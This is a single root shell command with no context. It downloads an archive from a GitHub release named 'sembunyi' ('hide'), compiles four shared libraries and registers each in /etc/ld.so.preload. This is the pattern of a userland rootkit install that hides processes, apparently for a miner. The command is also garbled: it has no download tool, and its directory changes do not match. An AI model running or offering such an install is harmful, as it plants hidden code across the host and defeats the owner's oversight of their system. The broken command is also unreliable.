sudo su --command "https://github.com/p4n1k/mnr/releases/download/sembunyi/01.tar.gz && tar -xvf 01.tar.gz && cd 01 && make && sudo mv libsembunyi01.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi01.so >> /etc/ld.so.preload && cd 02 && make && sudo mv libsembunyi02.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi02.so >> /etc/ld.so.preload && cd 03 && make && sudo mv libsembunyi03.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi03.so >> /etc/ld.so.preload && cd 04 && make && sudo mv libsembunyi04.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi04.so >> /etc/ld.so.preload"
